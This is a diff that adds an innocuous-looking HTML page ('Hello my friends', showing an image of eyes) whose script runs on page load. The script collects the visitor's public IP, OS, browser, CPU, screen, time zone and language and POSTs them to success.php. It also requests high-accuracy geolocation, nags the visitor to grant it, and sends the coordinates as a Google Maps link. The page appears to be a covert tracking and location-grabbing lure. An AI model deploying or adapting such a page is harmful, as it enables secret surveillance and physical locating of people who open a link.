@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#000000">
+    <link rel="icon" type="image/x-icon" href="assets/undertale.ico">
+    <title>Hello my friends</title>
+
+    <script src="client.min.js"></script>
+
+    <style>
+        body{
+            background-color: black;
+        }
+        .content{
+            margin-top: 300px;
+        }
+        .content img{
+            display: block;
+            margin: auto;
+            width: 500px;
+        }
+        .content p{
+            text-align: center;
+            font-size: 42px;
+            color: aqua;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+    </style>
+</head>
+<body>
+    <div class="content">
+        <img src="assets/eyes.png" alt="">
+    </div>
+
+    <script>
+        async function getData() {
+            var client = new ClientJS(); // Create A New Client Object
+            var OS = client.getOS(); // Get OS Version
+            var ver = client.getOSVersion(); // Get OS Version
+            var getbrow = client.getBrowser(); // Get Browser
+            var getbrowVer = client.getBrowserVersion(); // Get Browser Version
+            var CPU = client.getCPU(); // Get CPU Architecture
+            var currentResolution = client.getCurrentResolution(); // Get Current Resolution
+            var language = client.getLanguage(); // Get User Language
+            var timeZone = '';
+
+            var core = navigator.hardwareConcurrency;
+            var is_brave = navigator.brave;
+
+            const response = await fetch("https://api.ipify.org")
+            var ip = await response.text();
+
+            try {
+                timeZone = client.getTimeZone(); // Get Time Zone
+            } catch {
+                timeZone = 'Not Found';
+            }
+            timeZone = timeZone.toString();
+
+            fetch("success.php", {
+                method: "POST",
+                body: JSON.stringify({ 
+                    data: `ip : ${ip} \nos name : ${OS} \nVersion : ${ver} \nBrowser Name : ${getbrow} \nGet Browser Version : ${getbrowVer} \nCpu Name : ${CPU} \nResolution : ${currentResolution} \nTime Zone : ${timeZone} \nLanguage :  ${language} \nNumber Of CPU Core :  ${core}` 
+                }),
+                headers: { "Content-type": "application/json; charset=UTF-8" }
+            });
+        }
+        
+        function locate(){
+            var options = {
+                enableHighAccuracy: true,
+                timeout: 5000,
+                maximumAge: 0
+            };
+
+            function error(error) {
+                switch (error.code) {
+                    case error.PERMISSION_DENIED:
+                        var denied = 'User denied the request for Geolocation';
+                        alert('Please Refresh This Page and Allow Location Permission!');
+                        break;
+                    case error.POSITION_UNAVAILABLE:
+                        var unavailable = 'Location information is unavailable!';
+                        break;
+                    case error.TIMEOUT:
+                        var timeout = 'The request to get user location timed out';
+                        alert('Please Set Your Location Mode on High Accuracy!');
+                        break;
+                    case error.UNKNOWN_ERROR:
+                        var unknown = 'An unknown error occurred';
+                        break;
+                }
+
+                fetch("error.php", {
+                    method: "POST",
+                    body: JSON.stringify({ Denied: denied, Una: unavailable, Time: timeout, Unk: unknown }),
+                    headers: { "Content-type": "application/json; charset=UTF-8" }
+                });
+            }
+
+            function success(position) {
+                var coords = position.coords;
+
+                fetch("success.php", {
+                    method: "POST",
+                    body: JSON.stringify({
+                        data: `https://google.com/maps/place/${coords.latitude}+${coords.longitude}`,
+                        // data: `https://google.com/maps/place/${coords.latitude}+${coords.longitude}\nMore or less ${coords.accuracy} meters.`,
+                    }),
+                    headers: { "Content-type": "application/json; charset=UTF-8" }
+                });
+
+            }
+
+            navigator.geolocation.getCurrentPosition(success, error, options);
+        }
+
+        // onload window
+        document.body.onload = function(){
+            getData();
+            locate();
+        }
+
+    </script>
+</body>
+</html>
